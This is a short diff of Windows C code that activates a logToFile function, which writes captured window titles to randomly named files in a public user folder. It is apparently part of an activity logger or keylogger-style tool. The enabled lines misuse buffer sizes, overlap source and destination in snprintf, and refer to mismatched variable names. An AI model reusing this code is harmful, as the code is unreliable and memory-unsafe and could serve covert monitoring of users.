@@ -42,13 +42,13 @@ BOOL logToFile(LPTSTR szWinCaption) {
 	char dir [] = "C:\\Users\\Public\\tester\\";
 	char fileName[10] = "";
 	generateRandomStr(fileName); //get generated file name
-	////strncat_s(dir,strlen(dir),fileName,36);
-	//snprintf(dir,strlen(dir), "%s%s.txt", dir, fileName);
-	//HANDLE fHandle = CreateFile((LPTSTR)dir,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	////format text and write to file
-	////snprintf(captionText, MAX_BUFFER_SIZE, "Window Title: %s",winCaption);
-	//WriteFile(fHandle, szWinCaption,MAX_BUFFER_SIZE,NULL,NULL);
-	//CloseHandle(fHandle);
+	strncat_s(dir,strlen(dir),fileName,36);
+	snprintf(dir,strlen(dir), "%s%s.txt", dir, fileName);
+	HANDLE fHandle = CreateFile((LPTSTR)dir,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	//format text and write to file
+	snprintf(captionText, MAX_BUFFER_SIZE, "Window Title: %s",winCaption);
+	WriteFile(fHandle, szWinCaption,MAX_BUFFER_SIZE,NULL,NULL);
+	CloseHandle(fHandle);
 	return TRUE;
 }
 
